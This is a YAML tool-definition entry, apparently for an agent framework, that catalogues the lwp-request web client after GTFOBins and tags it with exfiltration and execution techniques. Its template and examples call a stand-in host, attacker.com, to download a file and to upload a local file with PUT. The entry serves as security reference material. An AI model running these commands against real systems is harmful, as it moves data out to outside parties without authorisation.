---
id: network-transfer-lwprequest
namespace: network:transfer:lwprequest
name: lwp-request
description: Perl web client, can download and upload files and execute commands.
author: "GTFOBins"
version: "1.0.0"
capabilities:
  - network.transfer.download
  - network.transfer.upload
  - security.execution.command
platforms:
  - linux
  - macos
  - bsd
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - lwp-download
  - wget
  - curl
artifacts: []
workflow_edges:
  produces:
    - file-content
    - command-execution
  consumes:
    - file
    - execution-context
contract:
  inputs: []
  outputs:
    - type: process.output
      description: File or command output
  side_effects:
    - network_traffic
    - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 4
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 4
  network: low
  disk_io: low
allowed-tools:
  - lwp-request
  - lwp-download
  - wget
  - curl
  - Bash
  - execFile
parameters: []
features:
  - file-system
  - process-manip
execution:
  template: "lwp-request https://attacker.com/file"
  sandbox: execFile
  timeout_seconds: 60
  shell: false
global_vars: {}
examples:
  - description: Download a file via lwp-request
    command: lwp-request https://attacker.com/file
  - description: Upload a file via lwp-request
    command: lwp-request -m PUT /path/to/file https://attacker.com/
references:
  - label: "GTFOBins"
    url: "https://gtfobins.github.io/gtfobins/lwp-request/"
techniques:
  - exfiltration
  - collection
  - execution
install:
  - method: apt
    package_name: "libwww-perl"
    commands:
      - "apt-get install -y libwww-perl"
---
